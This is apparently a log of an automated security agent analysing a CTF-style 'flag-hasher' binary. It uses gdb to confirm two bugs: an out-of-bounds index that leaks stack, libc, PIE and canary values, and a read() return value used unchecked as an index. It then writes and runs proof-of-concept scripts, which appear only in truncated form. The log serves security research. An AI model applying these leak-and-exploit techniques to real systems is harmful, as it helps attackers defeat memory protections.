19:59:08 [impact:BUG-001] 索引 146 的输出确认了信息泄露。输出 `A0EBFFFFFF7F00008B928BF7FF7F0000D8EBFFFFFF7F0000307D555555550000` 包含： - `A0EBFFFFFF7F0000` → 小端序 = `0x00007FFFFFFFEBA0`（栈地址） - `
19:59:08 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set environment flag=testflag; b *main+0x36d; run; printf \)
19:59:08 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x188e ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(1298 chars)
19:59:08 [impact:BUG-001] → 调用 GLM...
19:59:13 [impact:BUG-001] ← GLM(4.9s): 调工具[gdb_run]
19:59:13 [impact:BUG-001] 索引 147 的输出确认了 libc 代码泄露。现在让我测试索引 151（PIE 泄露）和索引 145（canary）：
19:59:13 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set environment flag=testflag; b *main+0x36d; run; printf \)
19:59:13 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x188e ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(1237 chars)
19:59:13 [impact:BUG-001] → 调用 GLM...
19:59:21 [impact:BUG-001] ← GLM(7.6s): 调工具[gdb_run]
19:59:21 [impact:BUG-001] 索引 151 的输出 `F30F1EFA554889E54881ECC004000064488B042528000000488945F831C0B800` 是 `main` 函数的反汇编（`endbr64; push rbp; mov rbp,rsp; sub rsp,0x4c0` 等）——这证实了
19:59:21 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set environment flag=testflag; b *main+0x2c4; run; printf \)
19:59:21 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x17e5 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(704 chars)
19:59:21 [impact:BUG-001] → 调用 GLM...
19:59:34 [impact:BUG-001] ← GLM(12.6s): 调工具[gdb_run]
19:59:34 [impact:BUG-001] canary 的低位字节为 0x00（这是 Linux canary 的标准配置）。canary 的值为 `0x8fc967fe15de7700`。由于最低字节为 0x00，当作为指针使用时，它指向 `0x8fc967fe15de7700`，这几乎肯定是一个未映射的地址 → 会导致 SIGSEGV。
19:59:34 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set environment flag=testflag; b *main+0x31f; run; printf \)
19:59:34 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x1840 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(883 chars)
19:59:34 [impact:BUG-001] → 调用 GLM...
19:59:41 [impact:BUG-001] ← GLM(7.8s): 调工具[gdb_run]
19:59:41 [impact:BUG-001] 有趣！在 `0x1840` 处的断点显示 `$rax = 0x0`，但随后程序在 `0x1844` 处崩溃，此时 `rax = 0x82d91ddee0678800`（即 canary 值）。让我更仔细地跟踪一下。打印循环在 `0x1829` 处重新读取槽位，然后在 `0x1844` 处进行解引用。
19:59:41 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set environment flag=testflag; b *main+0x323; run; printf \)
19:59:42 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x1844 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(907 chars)
19:59:42 [impact:BUG-001] → 调用 GLM...
19:59:49 [impact:BUG-001] ← GLM(7.9s): 调工具[gdb_run]
19:59:49 [impact:BUG-001] 确认。在 idx 145（canary 插槽）处： - `rdx` = canary 值 = `0x622c8dafc19a4800`（随机，低字节为 0x00） - `rax` = 相同值（循环计数器 0 + canary 值） - 程序尝试执行 `movzx eax, BYTE PTR [rax
19:59:49 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set environment flag=testflag; b *main+0x2c4; run; printf \)
19:59:59 [impact:BUG-001]   ← gdb_run(10.0s): gdb timed out (10s)。多半是程序 run 后阻塞——检查 stdin 是否提供了驱动程序到断点的输入序列；命令序列若含等待输入的交互命令也会卡。修改 commands/stdin 后重试，相同参数重调结果不变。
19:59:59 [impact:BUG-001] → 调用 GLM...
20:00:05 [impact:BUG-001] ← GLM(5.3s): 调工具[gdb_run]
20:00:05 [impact:BUG-001] `while` 循环导致 gdb 超时。让我改用更简单的命令：
20:00:05 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set environment flag=testflag; b *main+0x2c4; run; x/16gx $)
20:00:05 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x17e5 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(965 chars)
20:00:05 [impact:BUG-001] → 调用 GLM...
20:00:39 [impact:BUG-001] ← GLM(33.6s): 调工具[write_file]
20:00:39 [impact:BUG-001] 现在我已经掌握了从 idx 145 开始的完整情况。让我总结一下关键索引：  | Idx | Address | Value | Type | Behavior | |-----|---------|-------|------|----------| | 145 | rbp-8 | canary 
20:00:39 [impact:BUG-001]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nS3 Primitive Verification PoC for BUG-001\nOOB_ARRAY_INDEX_MISSING_BOUNDS_CHECK\n\nTarget: /work/workspac)
20:00:39 [impact:BUG-001]   ← write_file(0.0s): Updated file /work/workspace/0030-2024-55-flag-hasher-20260909-195252/poc-BUG-001.py
20:00:39 [impact:BUG-001] → 调用 GLM...
20:00:44 [impact:BUG-001] ← GLM(5.5s): 调工具[run_script]
20:00:44 [impact:BUG-001]   → 工具 run_script({"path": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/poc-BUG-001.py", "timeout": 30})
20:00:44 [impact:BUG-001]   ← run_script(0.1s): rc=0 ⏎ --- stdout (summarized) --- ⏎ ====================================================================== ⏎ BUG-001: OOB_ARRAY_INDEX_MISSING_BOUNDS_...(2484 chars)
20:00:44 [impact:BUG-001] → 调用 GLM...
20:00:57 [impact:BUG-001] ← GLM(12.9s): 调工具[edit_file]
20:00:57 [impact:BUG-001] PRIM-001 的地址检测失败，因为 ASLR 改变了地址，导致我的检测函数过于严格。泄露的数据确实存在——让我看看这些值： - `[0] 0x00007ffd03c29670` - 这是一个栈地址（0x7ffd... 前缀） - `[1] 0x0000778e82ad828b` - 这看起来像是
20:00:57 [impact:BUG-001]   → 工具 edit_file({"file_path": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/poc-BUG-001.py", "new_string": "def is_stack_addr(val):\n    \"\"\"Check if va)
20:00:57 [impact:BUG-001]   ← edit_file(0.0s): Successfully replaced 1 instance(s) of the string in '/work/workspace/0030-2024-55-flag-hasher-20260909-195252/poc-BUG-001.py'
20:00:57 [impact:BUG-001] → 调用 GLM...
20:01:03 [impact:BUG-001] ← GLM(5.6s): 调工具[run_script]
20:01:03 [impact:BUG-001]   → 工具 run_script({"path": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/poc-BUG-001.py", "timeout": 30})
20:01:03 [impact:BUG-001]   ← run_script(0.1s): rc=0 ⏎ --- stdout (summarized) --- ⏎ ====================================================================== ⏎ BUG-001: OOB_ARRAY_INDEX_MISSING_BOUNDS_...(2484 chars)
20:01:03 [impact:BUG-001] → 调用 GLM...
20:01:16 [impact:BUG-001] ← GLM(13.4s): 调工具[edit_file]
20:01:16 [impact:BUG-001] PRIM-001 的值显然是地址，但我的检测逻辑仍然无法匹配它们。让我检查一下： - `0x00007ffed0a4cd80` - 应该匹配 `is_stack_addr` (0x7ff0... 到 0x7fff...)。等等，`0x7ffe` 在 `0x7ff0` 和 `0x7fff` 之间……让
20:01:16 [impact:BUG-001]   → 工具 edit_file({"file_path": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/poc-BUG-001.py", "new_string": "def is_stack_addr(val):\n    \"\"\"Check if va)
20:01:16 [impact:BUG-001]   ← edit_file(0.0s): Successfully replaced 1 instance(s) of the string in '/work/workspace/0030-2024-55-flag-hasher-20260909-195252/poc-BUG-001.py'
20:01:16 [impact:BUG-001] → 调用 GLM...
20:01:22 [impact:BUG-001] ← GLM(5.9s): 调工具[run_script]
20:01:22 [impact:BUG-001]   → 工具 run_script({"path": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/poc-BUG-001.py", "timeout": 30})
20:01:22 [impact:BUG-001]   ← run_script(0.1s): rc=0 ⏎ --- stdout (summarized) --- ⏎ ====================================================================== ⏎ BUG-001: OOB_ARRAY_INDEX_MISSING_BOUNDS_...(2588 chars)
20:01:22 [impact:BUG-001] → 调用 GLM...
20:01:30 [impact:BUG-001] ← GLM(8.1s): 调工具[edit_file]
20:01:30 [impact:BUG-001] 所有四个原语均已验证。让我更仔细地分析一下 PRIM-001 的输出：  - `[0] 0x00007ffe73c013c0` - 栈地址 ✓ - `[1] 0x0000760aa06a028b` - 这实际上是一个 libc 地址，但 ASLR 将其映射到了 `0x760a...` 而不是 `0x
20:01:30 [impact:BUG-001]   → 工具 edit_file({"file_path": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/poc-BUG-001.py", "new_string": "def is_pie_addr(val):\n    \"\"\"Check if valu)
20:01:30 [impact:BUG-001]   ← edit_file(0.0s): Successfully replaced 1 instance(s) of the string in '/work/workspace/0030-2024-55-flag-hasher-20260909-195252/poc-BUG-001.py'
20:01:30 [impact:BUG-001] → 调用 GLM...
20:01:40 [impact:BUG-001] ← GLM(9.7s): 调工具[gdb_run]
20:01:40 [impact:BUG-001] 现在让我思考一下需要解决的关键问题。S2 报告将此 BUG 的主要影响识别为 INFO_LEAK 和 OOB_READ。让我分析一下完整的原语（primitive）情况：  1. **INFO_LEAK (idx 146)**：解引用保存的 rbp（栈地址）→ 读取 32 字节的栈内容，其中包含更多
20:01:40 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set environment flag=testflag; b *main+0x1ef; run; printf \)
20:01:40 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x1710 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(1276 chars)
20:01:40 [impact:BUG-001] → 调用 GLM...
20:01:45 [impact:BUG-001] ← GLM(4.6s): 调工具[gdb_run]
20:01:45 [impact:BUG-001] 断点位于 `0x1710`，即 `memset` 调用之后。程序在到达断点之前就退出了，因为 stdin 在菜单循环中触发了 EOF。让我尝试提供更多的输入：
20:01:45 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set environment flag=testflag; b *main+0x1ef; run; printf \)
20:01:45 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x1710 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(1305 chars)
20:01:45 [impact:BUG-001] → 调用 GLM...
20:01:51 [impact:BUG-001] ← GLM(5.9s): 调工具[gdb_run]
20:01:51 [impact:BUG-001] 程序在第二次菜单选择时读取了 "1\nBBBB\n2\n16\n"，但 scanf 读取 "1" 后留下了 "\nBBBB\n2\n16\n"。下一次 scanf 读取 "BBBB"，但这并不是一个有效的整数，因此触发了 "Unknown command" 并退出。让我使用正确的格式：
20:01:51 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set environment flag=testflag; b *main+0x1ef; run; printf \)
20:01:51 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x1710 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(1359 chars)
20:01:51 [impact:BUG-001] → 调用 GLM...
20:02:01 [impact:BUG-001] ← GLM(10.2s): 调工具[gdb_run]
20:02:01 [impact:BUG-001] 问题在于 `scanf("%d")` 在读取 "1" 后会留下 "\n"，随后的 `read()` 会读取该换行符。让我检查一下：在第一次计算（菜单选择 "1"）后，`scanf` 读取 "1"，留下 "\nAAAA\n1\n..."。然后 `read(0, buf, 0x3ff)` 读取 "\nA
20:02:01 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set environment flag=testflag; b *main+0x1ef; run; printf \)
20:02:01 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x1710 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(1300 chars)
20:02:01 [impact:BUG-001] → 调用 GLM...
20:02:17 [impact:BUG-001] ← GLM(16.3s): 调工具[write_file]
20:02:17 [impact:BUG-001] 断点在 `0x1710` 处，即 `memset` 调用之后。但程序在到达断点之前就退出了。问题在于 `read()` 消耗了所有剩余的 `stdin`。让我尝试另一种方法——使用 Python 脚本通过 `pwntools` 来正确驱动程序：
20:02:17 [impact:BUG-001]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nDebug script: verify text buffer is zeroed when read path executes.\nAlso check if we can plant fake poin)
20:02:17 [impact:BUG-001]   ← write_file(0.0s): Updated file /work/workspace/0030-2024-55-flag-hasher-20260909-195252/debug_test.py
20:02:17 [impact:BUG-001] → 调用 GLM...
20:02:19 [impact:BUG-001] ← GLM(1.9s): 调工具[run_script]
20:02:19 [impact:BUG-001]   → 工具 run_script({"path": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/debug_test.py", "timeout": 30})
20:02:19 [impact:BUG-001]   ← run_script(0.3s): rc=0 ⏎ --- stdout (summarized) --- ⏎ Read idx 16 result: b' Entry does not exist.\n' ⏎ Read idx 146 result: b" Hash - 146 : 90220B9DFC7F00008BF29FD89F...(1004 chars)
20:02:19 [impact:BUG-001] → 调用 GLM...
20:02:28 [impact:BUG-001] ← GLM(9.1s): 调工具[read_file]
20:02:28 [impact:BUG-001] 所有测试已确认： 1. **idx 16**：文本缓冲区已置零 → "Entry does not exist" (NULL 检查捕获了它) - 证实无法植入伪造指针 2. **idx 146**：泄露了栈地址 (`0x00007ffc9d0b2290`)、libc 地址 (`0x0000739fd
20:02:28 [impact:BUG-001]   → 工具 read_file({"file_path": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/poc-BUG-001.py"})
20:02:28 [impact:BUG-001]   ← read_file(0.0s):   1  #!/usr/bin/env python3 ⏎   2  """ ⏎   3  S3 Primitive Verification PoC for BUG-001 ⏎   4  OOB_ARRAY_INDEX_MISSING_BOUNDS_CHECK ⏎   5   ⏎   6  Tar...(3728 chars)
20:02:28 [impact:BUG-001] → 调用 GLM...
20:02:31 [impact:BUG-001] ← GLM(2.4s): 调工具[read_file]
20:02:31 [impact:BUG-001]   → 工具 read_file({"file_path": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/poc-BUG-001.py", "offset": 100})
20:02:31 [impact:BUG-001]   ← read_file(0.0s): 101  hex_str = extract_hash_hex(out) ⏎ 102  if hex_str: ⏎ 103      print(f"  Return code: {rc}") ⏎ 104      print(f"  Raw hex output: {hex_str}") ⏎ 10...(5096 chars)
20:02:31 [impact:BUG-001] → 调用 GLM...
20:02:35 [impact:BUG-001] ← GLM(4.3s): 调工具[read_file]
20:02:35 [impact:BUG-001]   → 工具 read_file({"file_path": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/poc-BUG-001.py", "offset": 200})
20:02:35 [impact:BUG-001]   ← read_file(0.0s): 201  # ============================================================ ⏎ 202  # Summary ⏎ 203  # ========================================================...(899 chars)
20:02:35 [impact:BUG-001] → 调用 GLM...
20:03:41 [impact:BUG-001] ← GLM(65.4s): 调工具[write_file]
20:03:41 [impact:BUG-001] PoC 脚本看起来不错。现在让我思考一下还需要解决哪些问题：  1. **ARB_READ 分析**：攻击者无法控制解引用的指针值，因为文本缓冲区（索引 16-145）在读取路径运行前总是被清零。索引 0-15 是合法的堆指针。索引 146+ 是固定的栈值。因此 ARB_READ 不成立——只有 I
20:03:41 [impact:BUG-001]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nS3 Primitive Verification PoC for BUG-001\nOOB_ARRAY_INDEX_MISSING_BOUNDS_CHECK\n\nTarget: /work/workspac)
20:03:41 [impact:BUG-001]   ← write_file(0.0s): Updated file /work/workspace/0030-2024-55-flag-hasher-20260909-195252/poc-BUG-001.py
20:03:41 [impact:BUG-001] → 调用 GLM...
20:03:43 [impact:BUG-001] ← GLM(2.8s): 调工具[run_script]
20:03:43 [impact:BUG-001]   → 工具 run_script({"path": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/poc-BUG-001.py", "timeout": 30})
20:03:43 [impact:BUG-001]   ← run_script(0.1s): rc=0 ⏎ --- stdout (summarized) --- ⏎ ====================================================================== ⏎ BUG-001: OOB_ARRAY_INDEX_MISSING_BOUNDS_...(2304 chars)
20:03:43 [impact:BUG-001] → 调用 GLM...
20:03:46 [impact:BUG-001] ← GLM(2.2s): 调工具[delete]
20:03:46 [impact:BUG-001] 所有原语均已验证。现在让我清理调试文件并完成收尾工作：
20:03:46 [impact:BUG-001]   → 工具 delete({"file_path": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/debug_test.py"})
20:03:46 [impact:BUG-001]   ← delete(0.0s): Deleted /work/workspace/0030-2024-55-flag-hasher-20260909-195252/debug_test.py
20:03:46 [impact:BUG-001] → 调用 GLM...
20:03:48 [impact:BUG-001] ← GLM(2.4s): 调工具[checksec]
20:03:48 [impact:BUG-001] 现在让我来汇总最终分析。让我验证一下缓解措施（mitigations）并检查一些剩余的细节：
20:03:48 [impact:BUG-001]   → 工具 checksec({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target"})
20:03:48 [impact:BUG-001]   ← checksec(0.2s): [*] '/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target' ⏎     Arch:       amd64-64-little ⏎     RELRO:      Full RELRO ⏎     Stack:     ...(298 chars)
20:03:48 [impact:BUG-001] → 调用 GLM...
20:06:01 [impact:BUG-001] ← GLM(132.8s): 调工具[submit_final_result]
20:06:01 [impact:BUG-001] 现在让我来分析缓解措施的影响：  1. **Full RELRO**: GOT 表是只读的 → 无法进行 GOT 覆盖。但这并不影响 INFO_LEAK 原语（它是一个读取操作，而不是写入操作）。  2. **Canary**: 存在栈 canary。canary 位于 idx 145，其低字节为 
20:06:01 [impact:BUG-001] ✓ submit_final_result 收到最终报告（PrimitiveReport 校验通过，23804 chars）
20:06:01 [impact:BUG-001] → 调用 GLM...
20:06:14 [impact:BUG-001] ← GLM(12.6s)
20:06:14 [impact:BUG-001] S3 Primitive 分析与验证已完成。以下是针对 BUG-001 所完成工作的总结：  ## BUG-001: OOB_ARRAY_INDEX_MISSING_BOUNDS_CHECK  ### 已验证原语  **PRIM-001: INFO_LEAK (已验证, 直接)** - 该漏洞允许攻
20:06:14 === impact (bug_id=BUG-002) ===
20:06:14 [impact:BUG-002] → 调用 GLM...
20:06:19 [impact:BUG-002] ← GLM(4.7s): 调工具[disassemble]
20:06:19 [impact:BUG-002] 我将分析 BUG-002：`READ_RETURN_VALUE_USED_AS_INDEX_WITHOUT_VALIDATION`。让我先检查一下漏洞代码周围的精确反汇编，以理解其语义。
20:06:19 [impact:BUG-002]   → 工具 disassemble({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "function": "main", "lines": 200})
20:06:19 [impact:BUG-002]   ← disassemble(0.0s): 0000000000001521 <main>: ⏎     1521:	endbr64 ⏎     1525:	push   rbp ⏎     1526:	mov    rbp,rsp ⏎     1529:	sub    rsp,0x4c0 ⏎     1530:	mov    rax,QWO...(6712 chars)
20:06:19 [impact:BUG-002] → 调用 GLM...
20:06:25 [impact:BUG-002] ← GLM(6.3s): 调工具[probe_io]
20:06:25 [impact:BUG-002] 现在我已经完全掌握了漏洞代码。让我仔细分析一下关键指令：  - `0x16a6`: `call read@plt` — `read(0, rbp-0x410, 0x3ff)` - `0x16ab`: `mov [rbp-0x49c], eax` — 存储返回值 - `0x16b1`: `mov ea
20:06:25 [impact:BUG-002]   → 工具 probe_io({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "steps": "[{\"recv_until\": \">\", \"send\": \"1\"}]"})
20:06:25 [impact:BUG-002]   ← probe_io(0.1s): PROBE_ERROR: EOFError:
20:06:25 [impact:BUG-002] → 调用 GLM...
20:06:30 [impact:BUG-002] ← GLM(5.3s): 调工具[execute]
20:06:30 [impact:BUG-002] 程序需要 `flag` 环境变量。让我用设置好的环境变量重试。
20:06:30 [impact:BUG-002]   → 工具 execute({"command": "cd /work/workspace/0030-2024-55-flag-hasher-20260909-195252 && echo \"testflag\" | FLAG=test flag=target 2>/dev/null; echo \"---\"; env f)
20:06:30 [impact:BUG-002]   ← execute(0.0s): [stderr] /bin/sh: 1: Syntax error: redirection unexpected ⏎  ⏎ Exit code: 2 ⏎ [Command failed with exit code 2]
20:06:30 [impact:BUG-002] → 调用 GLM...
20:06:33 [impact:BUG-002] ← GLM(2.1s): 调工具[execute]
20:06:33 [impact:BUG-002]   → 工具 execute({"command": "cd /work/workspace/0030-2024-55-flag-hasher-20260909-195252 && printf '1\\nhello\\n' | env flag=testflag timeout 3 ./target 2>&1 | head -)
20:06:33 [impact:BUG-002]   ← execute(0.0s):       _           ___  _____   __   ⏎      | |         |__ \| ____| / /   ⏎   ___| |__   __ _   ) | |__  / /_   ⏎  / __| '_ \ / _` | / /|___ \| '_ \  ...(792 chars)
20:06:33 [impact:BUG-002] → 调用 GLM...
20:06:36 [impact:BUG-002] ← GLM(3.8s): 调工具[execute]
20:06:36 [impact:BUG-002] 很好，程序在设置了 `flag` 环境变量后可以运行。现在让我来理解一下这个 BUG。当选择了 compute 路径 (1) 并且 `read()` 返回 0 (EOF) 时，该漏洞就会被触发。让我测试一下在 compute 路径中关闭 stdin 会发生什么。
20:06:36 [impact:BUG-002]   → 工具 execute({"command": "cd /work/workspace/0030-2024-55-flag-hasher-20260909-195252 && printf '1\\n' | env flag=testflag timeout 3 ./target 2>&1 | head -20; echo)
20:06:36 [impact:BUG-002]   ← execute(0.0s):       _           ___  _____   __   ⏎      | |         |__ \| ____| / /   ⏎   ___| |__   __ _   ) | |__  / /_   ⏎  / __| '_ \ / _` | / /|___ \| '_ \  ...(802 chars)
20:06:36 [impact:BUG-002] → 调用 GLM...
20:06:48 [impact:BUG-002] ← GLM(12.0s): 调工具[gdb_run]
20:06:48 [impact:BUG-002] 有趣的是，当 `read()` 返回 0 (EOF) 时，程序并没有崩溃。空字符串的哈希值是 `E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855`（即空字符串的 SHA256）。这意味着 `read()` 返回了 0，并
20:06:48 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set env flag=testflag; b *main+0x18b; run; info registers r)
20:06:48 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x16ac ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(1069 chars)
20:06:48 [impact:BUG-002] → 调用 GLM...
20:07:06 [impact:BUG-002] ← GLM(17.7s): 调工具[gdb_run]
20:07:06 [impact:BUG-002] 有趣！程序在 `0x16ac`（即 `main+0x18b`）处发生了 SIGSEGV。等等，`0x16ac` 是 `mov [rbp-0x49c], eax` —— 即存储 `read` 返回值之后。但断点设置在 `0x16ac`，而崩溃也发生在 `0x16ac`。让我仔细看看——崩溃发生在 `0
20:07:06 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set env flag=testflag; b *main+0x19b; run; info registers r)
20:07:06 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x16bc ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(847 chars)
20:07:06 [impact:BUG-002] → 调用 GLM...
20:07:29 [impact:BUG-002] ← GLM(23.3s): 调工具[gdb_run]
20:07:29 [impact:BUG-002] 太棒了！这是一个关键发现。当 `read()` 返回 0 (EOF) 时： - `eax = 0 - 1 = -1` (0xFFFFFFFF 作为 32 位) - `cdqe` 将其符号扩展为 `rax = 0xFFFFFFFFFFFFFFFF` - 目标地址 = `rbp + 0xFFFFFFFF
20:07:29 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set env flag=testflag; b *main+0x19b; run; printf \"RBP=0x%)
20:07:30 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x16bc ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(2015 chars)
20:07:30 [impact:BUG-002] → 调用 GLM...
20:07:59 [impact:BUG-002] ← GLM(29.7s): 调工具[gdb_run]
20:07:59 [impact:BUG-002] 现在我了解了全貌。让我分析一下内存布局：  - `hash_array` 在 `rbp-0x490` (16 个条目，每个 8 字节 = 0x80 字节，到 `rbp-0x410`) - `text_buf` 在 `rbp-0x410` (0x400 字节，到 `rbp-0x10`) - `rbp-
20:07:59 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set env flag=testflag; b *main+0x19b; run; printf \"=== rea)
20:07:59 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x16bc ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(1389 chars)
20:07:59 [impact:BUG-002] → 调用 GLM...
20:08:11 [impact:BUG-002] ← GLM(11.6s): 调工具[gdb_run]
20:08:11 [impact:BUG-002] 现在我已经完全理解了该漏洞的行为：  1. 当 `read()` 返回 0 (EOF) 时：索引 = -1，目标 = `rbp-0x411`（有效的栈地址，在 `hash_array[15]` 内部） 2. 读取的字节为 `0x00`（因为 `hash_array[15]` 为 NULL/零） 3.
20:08:11 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set env flag=testflag; b *main+0x19b; run; printf \"=== Fir)
20:08:11 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x16bc ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(1137 chars)
20:08:11 [impact:BUG-002] → 调用 GLM...
20:08:36 [impact:BUG-002] ← GLM(24.8s): 调工具[write_file]
20:08:36 [impact:BUG-002] 断点只在第一次计算时命中了一次（当 `read` 从 stdin 获取 "a\n" 时）。后续的 `read` 调用没有命中断点，因为程序在第二次菜单迭代时从 scanf 读取到了 "Unknown command"（未知命令）。问题在于，在第一次计算和第二次菜单选择之间，stdin 缓冲区被消耗了
20:08:36 [impact:BUG-002]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nPoC for BUG-002: READ_RETURN_VALUE_USED_AS_INDEX_WITHOUT_VALIDATION\n\nRoot Cause:\n  In the compute path)
20:08:36 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0030-2024-55-flag-hasher-20260909-195252/poc-BUG-002.py
20:08:36 [impact:BUG-002] → 调用 GLM...
20:08:39 [impact:BUG-002] ← GLM(3.6s): 调工具[run_script]
20:08:39 [impact:BUG-002]   → 工具 run_script({"path": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/poc-BUG-002.py", "timeout": 15})
20:08:40 [impact:BUG-002]   ← run_script(0.0s): rc=0 ⏎ --- stdout (summarized) --- ⏎ === PRIM-001: OOB_READ (1-byte stack read via EOF) === ⏎ Return code: 1 ⏎ [+] Program computed SHA256 of empty st...(1435 chars)
20:08:40 [impact:BUG-002] → 调用 GLM...
20:08:54 [impact:BUG-002] ← GLM(14.3s): 调工具[gdb_run]
20:08:54 [impact:BUG-002] PoC 已确认该行为。现在让我更仔细地验证 GDB 证据，以确认读取的字节确实仅用于分支条件，并检查是否存在任何可观察到的副作用。我还将验证 `read()` 是否可能返回 -1（错误情况），以及 `rbp-0x412` 处的字节是否可能不同。  让我再检查一个重要的细节：当 `hash_array
20:08:54 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0030-2024-55-flag-hasher-20260909-195252/target", "commands": "set env flag=testflag; b *main+0x19b; ignore 1 16; run; pri)
20:08:54 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x16bc ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(1574 chars)
20:08:54 [impact:BUG-002] → 调用 GLM...
